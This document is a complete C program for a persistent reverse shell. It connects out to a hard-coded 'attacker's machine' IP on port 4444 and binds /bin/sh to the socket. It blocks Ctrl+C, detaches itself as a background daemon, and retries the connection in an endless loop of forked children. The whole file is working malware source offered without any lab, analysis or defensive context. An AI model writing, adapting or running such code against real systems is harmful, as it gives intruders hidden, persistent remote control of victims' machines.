#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>

#define IP "192.168.100.215"  // Attacker's machine IP
#define PORT 4444              // Port to use for the connection

// Signal handler to catch SIGINT (Ctrl+C), allowing the program to continue
void handle_sigint(int sig) {
    // Do nothing to block Ctrl+C
}

// Function to attempt a connection and handle retrying
int attempt_connection(struct sockaddr_in *server) {
    int sock;
    while (1) {
        // Create socket for new connection attempt
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            return -1;  // Return error if socket creation fails
        }

        // Try to connect
        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            close(sock);  // Close socket on connection failure
            sleep(2);     // Wait before retrying
            continue;     // Retry connection indefinitely
        }

        return sock;  // Return the socket if successfully connected
    }
}

// Reverse shell function
void reverse_shell(int sock) {
    dup2(sock, 0);  // Redirect stdin
    dup2(sock, 1);  // Redirect stdout
    dup2(sock, 2);  // Redirect stderr

    char *const args[] = {"/bin/sh", NULL};
    execvp(args[0], args);  // Execute shell
}

// Main logic to continuously attempt reverse shell connections
int main() {
    // Ignore SIGINT (Ctrl+C) so the program doesn’t terminate when interrupted
    signal(SIGINT, handle_sigint);

    // Daemonize the program: Run in the background as a daemon
    if (fork() != 0) {
        exit(0);  // Parent process exits to detach child process in the background
    }

    if (setsid() == -1) {
        exit(1);  // Exit if it’s not possible to detach from terminal
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);  // Set the server IP address

    while (1) {
        pid_t pid = fork();  // Fork a new child process

        if (pid == 0) {
            // In the child process: attempt connection and reverse shell
            int sock = attempt_connection(&server);  // Attempt to connect
            if (sock != -1) {
                reverse_shell(sock);  // Once connected, run reverse shell
                close(sock);           // Close the socket when done
                exit(0);               // Exit child process after shell closes
            } else {
                exit(1);  // Exit child process if connection fails
            }
        }

        sleep(1);  // Parent process sleeps briefly before retrying
    }

    return 0;  // End the program if everything fails
}

